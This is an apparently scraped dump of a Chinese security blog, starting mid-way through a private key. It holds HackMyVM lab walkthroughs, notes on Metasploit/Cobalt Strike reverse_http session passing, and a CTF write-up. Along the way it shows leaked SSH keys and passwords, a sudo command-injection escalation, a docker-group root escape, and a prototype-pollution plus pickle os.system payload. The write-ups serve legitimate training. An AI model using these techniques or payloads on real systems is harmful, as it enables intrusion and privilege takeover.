vzLP1pL4O11OkPBAAAAAwEAAQAAAQBIArRoQOGJh9AMWBS6oBgUC+lw4Ptq710Q7sOAFMxE7BnEsFZeI62TgZqqpNkdHjr2xuT1ME5YpK5niMzFkkIEd5SEwK6rKRfUcB3lyZWaoMoIBJ1pZoY1c2qYw1KTb3hVUEbgsmRugIhwWGC+anFfavaJCMDrnCO2g8VMnT/cTyAv/Qmi8m868KNEzcuzGV5ozHl1XLffHM9R/cqPPyAYaQIa9Z+kS6ou9RiMTjTSxOPnfh286kgx0ry1se9BBlrEc5251R/PRkEKYrMj3AIwI30qvYlAtNfcCFhoJXLqvWystPARwiUs7WYBUHRf6bPP/pHTTvwwb2bs51ngImpdAAAAgDaWnQ7Lj7Vp+mTjhSu4oGptDHNd2uuqB1+CHRcaVutUmknxvxG3p957UbvNp6e0+ePKtAIakrzbpAo6u25poyWugAuzX2nQhqsQh6yrThDJlTiDMeV7JNGFbGOcanXXXHt3tjfyrS0+aM87WmwqNyh6nfgy1C5axRfKZG8ivz5iAAAAgQD83QmCIcbZaCOlGwgHGcuCUDcxGY1QlIRnbM5VAjimNezGFs9f0ExDSiTwFsmITP//njsbRZP2laiKKO6j4yp5LpfgDB5QHs+g4nXvDn6ns64gCKo7tf2bPP8VCeFWyc2JyqREwE3WmyhkPlyr9xAZerZ+7Fz+NFueRYzDklWg8wAAAIEAxhBeLqbo6/GUKXF5rFRatLXI43Jrd9pyvLx62KghsnEBEk7my9sbU5dvYBLztS+lfPCRxV2ZzpjYdN4SDJbXIRtxBaLJe3c4uIc9WjyxGwUK9IL65rSrRVERHsTO525ofPWGQEa2A+pRCpz3A4Y41fy8Y9an2B2NmfTAfEkWFXsAAAALcm9vdEBiYXNlbWU=-----END OPENSSH PRIVATE KEY----- 123456789101112┌──(root㉿kali)-[~/Desktop/tmp]└─# ssh root@192.168.31.232 -i id_rsaLinux MiWiFi-RA71-srv 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Wed Jan 22 08:08:11 2025 from 192.168.31.129root@MiWiFi-RA71-srv:~# 总结在处理字典的时候还可以有更高效的方法，其他的就没啥了","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-Pwned","slug":"HackmyVM-Pwned","date":"2025-01-22T06:22:18.000Z","updated":"2025-04-19T13:25:36.808Z","comments":true,"path":"2025/01/22/HackmyVM-Pwned/","permalink":"https://lvzhouhang.xyz/2025/01/22/HackmyVM-Pwned/","excerpt":"","text":"信息搜集arp-scan -l扫描ip 123456789101112┌──(root㉿kali)-[~/Desktop/tmp]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 a4:a9:30:df:ef:44 (Unknown)192.168.31.51 08:00:27:c4:72:27 PCS Systemtechnik GmbH192.168.31.220 46:3e:62:f9:1e:fa (Unknown: locally administered)192.168.31.187 a6:9b:e0:2d:30:9a (Unknown: locally administered)192.168.31.85 7e:2c:58:df:4e:cb (Unknown: locally administered)5 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 1.986 seconds (128.90 hosts/sec). 5 responded ip为192.168.31.51，然后nmap扫描开放端口 12345678910111213┌──(root㉿kali)-[~/Desktop/tmp]└─# nmap 192.168.31.51 --min-rate=1000 -p-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 01:21 ESTNmap scan report for pwned (192.168.31.51)Host is up (0.00019s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE21/tcp open ftp22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:C4:72:27 (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 13.85 seconds 开放了21,22,80端口 80端口1234567891011121314151617181920212223┌──(root㉿kali)-[~/Desktop/tmp]└─# gobuster dir -u &quot;http://192.168.31.51&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.31.51[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/nothing (Status: 301) [Size: 316] [--&gt; http://192.168.31.51/nothing/]/server-status (Status: 403) [Size: 278]/hidden_text (Status: 301) [Size: 320] [--&gt; http://192.168.31.51/hidden_text/]Progress: 220559 / 220560 (100.00%)===============================================================Finished=============================================================== /nothing: 1i said nothing bro /hidden_text: 123456789101112131415161718192021/hacked/vanakam_nanba/hackerman.gif /facebook/whatsapp/instagram/pwned/pwned.com/pubg /cod/fortnite/youtube/kali.org/hacked.vuln/users.vuln/passwd.vuln/pwned.vuln/backup.vuln/.ssh/root/home 利用给的目录扫描 123456789101112131415161718192021┌──(root㉿kali)-[~/Desktop/tmp]└─# gobuster dir -u &quot;http://192.168.31.51&quot; -w ./secret.dic===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.31.51[+] Method: GET[+] Threads: 10[+] Wordlist: ./secret.dic[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/pwned.vuln (Status: 301) [Size: 319] [--&gt; http://192.168.31.51/pwned.vuln/]Progress: 22 / 23 (95.65%)===============================================================Finished=============================================================== 前端给了源码 1234567891011121314&lt;?php// if (isset($_POST[&#x27;submit&#x27;])) &#123;// $un=$_POST[&#x27;username&#x27;];// $pw=$_POST[&#x27;password&#x27;];//// if ($un==&#x27;ftpuser&#x27; &amp;&amp; $pw==&#x27;B0ss_B!TcH&#x27;) &#123;// echo &quot;welcome&quot;// exit();// &#125;// else // echo &quot;Invalid creds&quot;// &#125;?&gt; 这是ftp的账号然后登录ftp 21端口123456ftp&gt; ls -la229 Entering Extended Passive Mode (|||48619|)150 Here comes the directory listing.drwxrwxrwx 3 0 0 4096 Jul 09 2020 .drwxr-xr-x 5 0 0 4096 Jul 10 2020 ..drwxr-xr-x 2 0 0 4096 Jul 10 2020 share 有一个share文件夹，文件夹有id_rsa和note.txt 123456ftp&gt; ls229 Entering Extended Passive Mode (|||53927|)150 Here comes the directory listing.-rw-r--r-- 1 0 0 2602 Jul 09 2020 id_rsa-rw-r--r-- 1 0 0 75 Jul 09 2020 note.txt226 Directory send OK. get下载下来 1234567891011121314ftp&gt; get id_rsalocal: id_rsa remote: id_rsa229 Entering Extended Passive Mode (|||26918|)150 Opening BINARY mode data connection for id_rsa (2602 bytes).100% |***************************************************************************| 2602 350.29 KiB/s 00:00 ETA226 Transfer complete.2602 bytes received in 00:00 (308.45 KiB/s)ftp&gt; get note.txtlocal: note.txt remote: note.txt229 Entering Extended Passive Mode (|||52418|)150 Opening BINARY mode data connection for note.txt (75 bytes).100% |***************************************************************************| 75 34.79 KiB/s 00:00 ETA226 Transfer complete.75 bytes received in 00:00 (21.66 KiB/s) 文件内容 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849┌──(root㉿kali)-[~/Desktop/tmp]└─# cat id_rsa-----BEGIN OPENSSH PRIVATE KEY-----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-----END OPENSSH PRIVATE KEY-----┌──(root㉿kali)-[~/Desktop/tmp]└─# cat note.txtWow you are hereariana won&#x27;t happy about this notesorry ariana :( 给了ssh的私钥和用户名,给id_rsa文件600的权限然后登录 123456789101112131415161718┌──(root㉿kali)-[~/Desktop/tmp]└─# ssh ariana@192.168.31.51 -i id_rsaThe authenticity of host &#x27;192.168.31.51 (192.168.31.51)&#x27; can&#x27;t be established.ED25519 key fingerprint is SHA256:Eu7UdscPxuaxyzophLkeILniUaKCge0R96HjWhAmpyk.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#x27;192.168.31.51&#x27; (ED25519) to the list of known hosts.Linux pwned 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Fri Jul 10 13:03:23 2020 from 192.168.18.70ariana@pwned:~$ lsariana-personal.diary user1.txt 提权123456ariana@pwned:/$ sudo -lMatching Defaults entries for ariana on pwned: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser ariana may run the following commands on pwned: (selena) NOPASSWD: /home/messenger.sh 可以以selena用户，无密码运行/home/messenger.sh messenger.sh的内容： 123456789101112131415161718192021ariana@pwned:/home$ cat messenger.sh#!/bin/bashclearecho &quot;Welcome to linux.messenger &quot; echo &quot;&quot;users=$(cat /etc/passwd | grep home | cut -d/ -f 3) echo &quot;&quot;echo &quot;$users&quot; echo &quot;&quot;read -p &quot;Enter username to send message : &quot; name echo &quot;&quot;read -p &quot;Enter message for $name :&quot; msg echo &quot;&quot;echo &quot;Sending message to $name &quot;$msg 2&gt; /dev/null echo &quot;&quot;echo &quot;Message sent to $name :) &quot; echo &quot;&quot; 直接sudo运行可以提权到selena，然后用python获取伪终端 1234567891011121314151617ariana@pwned:/home$ sudo -u selena /home/messenger.shWelcome to linux.messengerariana:selena:ftpuser:Enter username to send message : selenaEnter message for selena :bashSending message to selenaiduid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;selena@pwned:/home$ selena的主目录下有一个user2.txt 通过id能看到用户在docker组里 12selena@pwned:/$ iduid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker) 123456selena@pwned:/$ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEprivesc latest 09ae39f0f8fc 4 years ago 88.3MB&lt;none&gt; &lt;none&gt; e13ad046d435 4 years ago 88.3MBalpine latest a24bb4013296 4 years ago 5.57MBdebian wheezy 10fcec6d95c4 5 years ago 88.3MB docker提权 123selena@pwned:/$ docker run -v /:/mnt --rm -it alpine chroot /mnt shid# uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo) 提权成功 总结默认情况下，Docker 软件包是会默认添加一个 docker 用户组的。Docker 守护进程会允许 root 用户和 docker组用户访问 Docker，给用户提供 Docker 权限；用户在docker组里就可以免sudo运行docker，而容器内默认是root用户，用-v选项将用户外的目录映射到容器内既可以以root用户去修改文件","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-Gift","slug":"HackmyVM-Gift","date":"2025-01-22T05:49:56.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2025/01/22/HackmyVM-Gift/","permalink":"https://lvzhouhang.xyz/2025/01/22/HackmyVM-Gift/","excerpt":"","text":"信息搜集用arp-scan扫描 123456789101112┌──(root㉿kali)-[~]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 a4:a9:30:df:ef:44 (Unknown)192.168.31.200 08:00:27:5f:2f:1e PCS Systemtechnik GmbH192.168.31.220 46:3e:62:f9:1e:fa (Unknown: locally administered)192.168.31.187 a6:9b:e0:2d:30:9a (Unknown: locally administered)192.168.31.217 b4:0f:b3:8e:31:07 vivo Mobile Communication Co., Ltd.5 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 1.995 seconds (128.32 hosts/sec). 5 responded ip地址为192.168.31.200，然后nmap扫描开放的端口 123456789101112┌──(root㉿kali)-[~/Desktop/tmp]└─# nmap 192.168.31.200 --min-rate=1000Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 00:40 ESTNmap scan report for gift (192.168.31.200)Host is up (0.0080s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:5F:2F:1E (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 6.96 seconds 只开启了22和80端口 12345┌──(root㉿kali)-[~/Desktop/tmp]└─# curl http://192.168.31.200/Dont Overthink. Really, Its simple. &lt;!-- Trust me --&gt; 目录扫描也只有一个index.html,80端口没有入口点，只能找22端口,用hydra爆破root密码 1[22][ssh] host: 192.168.31.200 login: root password: simple SSH登录ssh &#x72;&#111;&#x6f;&#x74;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#56;&#46;&#x33;&#x31;&#46;&#50;&#x30;&#48; 能直接查看root.txt和user.txt 总结Dont Overthink. Really, Its simple.，Easy靶场,hydra直接爆破没什么好说的","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"记红日靶场2过程中的不足","slug":"记红日靶场2过程中的不足","date":"2024-11-11T11:31:08.000Z","updated":"2025-04-19T13:25:36.762Z","comments":true,"path":"2024/11/11/记红日靶场2过程中的不足/","permalink":"https://lvzhouhang.xyz/2024/11/11/%E8%AE%B0%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E4%B8%8D%E8%B6%B3/","excerpt":"","text":"msf派生cs123456789#msfbackgrounduse exploit/windows/local/payload_injectset payload windows/meterpreter/reverse_httpset DisablePayloadHandler trueset lhost 192.168.116.131set lport 9000set session 2run cs的监听要和lport的端口一样 cs派生msf123456#msfbackgrounduse payload payload/windows/meterpreter/reverse_httpset lhost 192.168.116.131set lport 9001run cs新建一个foreing http监听设置和msf的设置一样，然后cs新建会话到这个监听器即可。 其实不止这么多，包括进程迁移，票据之类的一个cs全部搞定了就，但是我还是想尝试一下怎么用纯手动打靶而且打靶环境过于理想完全没有考虑过流量特征的问题，有机会了补一篇，内网的学习路漫漫。","categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://lvzhouhang.xyz/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"内网","slug":"内网","permalink":"https://lvzhouhang.xyz/tags/%E5%86%85%E7%BD%91/"}]},{"title":"2024强网拟态复盘","slug":"2024强网拟态复盘","date":"2024-10-21T07:27:08.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2024/10/21/2024强网拟态复盘/","permalink":"https://lvzhouhang.xyz/2024/10/21/2024%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%A4%8D%E7%9B%98/","excerpt":"","text":"web复盘一下吧只做出来了两道，所有题都有一点思路，但是只有一点点可惜可惜，太可惜了。 capoo这是个非预期，capoo.php可以任意文件读取，能读取到start.sh,start.sh中泄露了flag的名字，直接读取就行 ez_picker123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144#源码from sanic import Sanicfrom sanic.response import json,file as file_,text,redirectfrom sanic_cors import CORSfrom key import secret_keyimport osimport pickleimport timeimport jwtimport ioimport builtinsapp = Sanic(&quot;App&quot;)pickle_file = &quot;data.pkl&quot;my_object = &#123;&#125;users = []safe_modules = &#123; &#x27;math&#x27;, &#x27;datetime&#x27;, &#x27;json&#x27;, &#x27;collections&#x27;,&#125;safe_names = &#123; &#x27;sqrt&#x27;, &#x27;pow&#x27;, &#x27;sin&#x27;, &#x27;cos&#x27;, &#x27;tan&#x27;, &#x27;date&#x27;, &#x27;datetime&#x27;, &#x27;timedelta&#x27;, &#x27;timezone&#x27;, &#x27;loads&#x27;, &#x27;dumps&#x27;, &#x27;namedtuple&#x27;, &#x27;deque&#x27;, &#x27;Counter&#x27;, &#x27;defaultdict&#x27;&#125;class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module in safe_modules and name in safe_names: return getattr(builtins, name) raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; %(module, name)) def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load()CORS(app, supports_credentials=True, origins=[&quot;http://localhost:8000&quot;, &quot;http://127.0.0.1:8000&quot;])class User: def __init__(self,username,password): self.username=username self.password=password def merge(src, dst): for k, v in src.items(): if hasattr(dst, &#x27;__getitem__&#x27;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)def token_required(func): async def wrapper(request, *args, **kwargs): token = request.cookies.get(&quot;token&quot;) if not token: return redirect(&#x27;/login&#x27;) try: result=jwt.decode(token, str(secret_key), algorithms=[&#x27;HS256&#x27;], options=&#123;&quot;verify_signature&quot;: True&#125;) except jwt.ExpiredSignatureError: return json(&#123;&quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Token expired&quot;&#125;, status=401) except jwt.InvalidTokenError: return json(&#123;&quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Invalid token&quot;&#125;, status=401) print(result) if result[&quot;role&quot;]!=&quot;admin&quot;: return json(&#123;&quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Permission Denied&quot;&#125;, status=401) return await func(request, *args, **kwargs) return wrapper@app.route(&#x27;/&#x27;, methods=[&quot;GET&quot;])def file_reader(request): file = &quot;app.py&quot; with open(file, &#x27;r&#x27;) as f: content = f.read() return text(content)@app.route(&#x27;/upload&#x27;, methods=[&quot;GET&quot;,&quot;POST&quot;])@token_requiredasync def upload(request): if request.method==&quot;GET&quot;: return await file_(&#x27;templates/upload.html&#x27;) if not request.files: return text(&quot;No file provided&quot;, status=400) file = request.files.get(&#x27;file&#x27;) file_object = file[0] if isinstance(file, list) else file try: new_data = restricted_loads(file_object.body) try: my_object.update(new_data) except: return json(&#123;&quot;status&quot;: &quot;success&quot;, &quot;message&quot;: &quot;Pickle object loaded but not updated&quot;&#125;) with open(pickle_file, &quot;wb&quot;) as f: pickle.dump(my_object, f) return json(&#123;&quot;status&quot;: &quot;success&quot;, &quot;message&quot;: &quot;Pickle object updated&quot;&#125;) except pickle.UnpicklingError: return text(&quot;Dangerous pickle file&quot;, status=400) @app.route(&#x27;/register&#x27;, methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])async def register(request): if request.method==&#x27;GET&#x27;: return await file_(&#x27;templates/register.html&#x27;) if request.json: NewUser=User(&quot;username&quot;,&quot;password&quot;) merge(request.json, NewUser) users.append(NewUser) else: return json(&#123;&quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Invalid request&quot;&#125;, status=400) return json(&#123;&quot;status&quot;: &quot;success&quot;, &quot;message&quot;: &quot;Register Success!&quot;,&quot;redirect&quot;: &quot;/login&quot;&#125;)@app.route(&#x27;/login&#x27;, methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])async def login(request): if request.method==&#x27;GET&#x27;: return await file_(&#x27;templates/login.html&#x27;) if request.json: username = request.json.get(&quot;username&quot;) password = request.json.get(&quot;password&quot;) if not username or not password: return json(&#123;&quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Username or password missing&quot;&#125;, status=400) user = next((u for u in users if u.username == username), None) if user: if user.password == password: data=&#123;&quot;user&quot;:username,&quot;role&quot;:&quot;guest&quot;&#125; data[&#x27;exp&#x27;] = int(time.time()) + 60 *5 token = jwt.encode(data, str(secret_key), algorithm=&#x27;HS256&#x27;) response = json(&#123;&quot;status&quot;: &quot;success&quot;, &quot;redirect&quot;: &quot;/upload&quot;&#125;) response.cookies[&quot;token&quot;]=token response.headers[&#x27;Access-Control-Allow-Origin&#x27;] = request.headers.get(&#x27;origin&#x27;) return response else: return json(&#123;&quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Invalid password&quot;&#125;, status=400) else: return json(&#123;&quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;User not found&quot;&#125;, status=404) return json(&#123;&quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Invalid request&quot;&#125;, status=400)if __name__ == &#x27;__main__&#x27;: app.run(host=&quot;0.0.0.0&quot;, port=8000) 考点就是原型链污染+pickle反序列化+jwt伪造，我当时感觉最难的是那个pickle反序列化，因为他是白名单虽然可以通过原型链污染进行修改但是这是由于对原理以及内建模块的不熟悉导致的，其实只需要把用到的模块和命令加入就行比如builtins、getattr、popen加入就好了 123456789#污染链&#123;&quot;__init__&quot;:&#123; &quot;__globals__&quot;:&#123; &quot;secret_key&quot;:&quot;66666&quot;, &quot;safe_modules&quot;:[&quot;os&quot;], &quot;safe_names&quot;:[&quot;eval&quot;], &#125; &#125;&#125; 12345#pickle链b&#x27;&#x27;&#x27;(cosevalS&#x27;os.system(\\&quot;calc\\&quot;)&#x27;o.&#x27;&#x27;&#x27; Spreader1234567891011121314151617181920212223242526272829303132333435363738# app.jsconst express = require(&#x27;express&#x27;);const session = require(&#x27;express-session&#x27;);const stringRandom = require(&#x27;string-random&#x27;);const bodyParser = require(&#x27;body-parser&#x27;);const app = express();const port = 3000;const AdminPassWord=stringRandom(16, &#123; numbers: true &#125;)const PrivilegedPassWord=stringRandom(16, &#123; numbers: true &#125;)const PlainPassWord=stringRandom(16, &#123; numbers: true &#125;)const secret_key=stringRandom(16, &#123; numbers: true &#125;)const users = [];const posts = [];const store = [];users.push(&#123; username:&quot;admin&quot;, password:AdminPassWord, role: &quot;admin&quot; &#125;);users.push(&#123; username:&quot;privileged&quot;, password:PrivilegedPassWord, role: &quot;privileged&quot; &#125;);users.push(&#123; username:&quot;plain&quot;, password:PlainPassWord, role: &quot;plain&quot; &#125;);console.log(users)app.use(express.static(&#x27;views&#x27;));app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);app.use(bodyParser.urlencoded(&#123; extended: true &#125;));app.use(session(&#123; secret: secret_key, resave: false, saveUninitialized: true, cookie: &#123; httpOnly: false, secure: false, &#125;&#125;));app.use(&#x27;/&#x27;, require(&#x27;./index&#x27;)(users,posts,store,AdminPassWord,PrivilegedPassWord));app.listen(port, () =&gt; &#123; console.log(`App is running on http://localhost:$&#123;port&#125;`);&#125;); 12345678910111213141516171819202122232425262728#bot.jsconst puppeteer = require(&#x27;puppeteer&#x27;);async function triggerXSS(UserName, PassWord) &#123; const browser = await puppeteer.launch(&#123; args: [&#x27;--no-sandbox&#x27;, &#x27;--disable-setuid-sandbox&#x27;], executablePath: &#x27;/usr/bin/chromium&#x27;, headless: true &#125;); const page = await browser.newPage(); await page.goto(&#x27;http://localhost:3000/login&#x27;); await page.type(&#x27;input[name=&quot;username&quot;]&#x27;, UserName); await page.type(&#x27;input[name=&quot;password&quot;]&#x27;, PassWord); await page.click(&#x27;button[type=&quot;submit&quot;]&#x27;); await page.goto(&#x27;http://localhost:3000/&#x27;); await browser.close(); return;&#125;module.exports = &#123; triggerXSS &#125;; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151#index.jsconst fs = require(&#x27;fs&#x27;);const express = require(&#x27;express&#x27;);const router = express.Router();const &#123; triggerXSS &#125; = require(&#x27;../bot&#x27;);const &#123; Store &#125; = require(&#x27;express-session&#x27;);function isAuthenticated(req, res, next) &#123; if (req.session.user) &#123; next(); &#125; else &#123; res.redirect(&#x27;/login&#x27;); &#125;&#125;module.exports = (users,posts,store,AdminPassWord,PrivilegedPassWord) =&gt; &#123; const ROLES = &#123; PLAIN: &quot;plain&quot;, PRIVILEGED: &quot;privileged&quot;, ADMIN: &quot;admin&quot;, &#125;; router.get(&#x27;/register&#x27;, (req, res) =&gt; &#123; res.sendFile(&#x27;register.html&#x27;, &#123; root: &#x27;./views&#x27; &#125;); &#125;); router.post(&#x27;/register&#x27;, (req, res) =&gt; 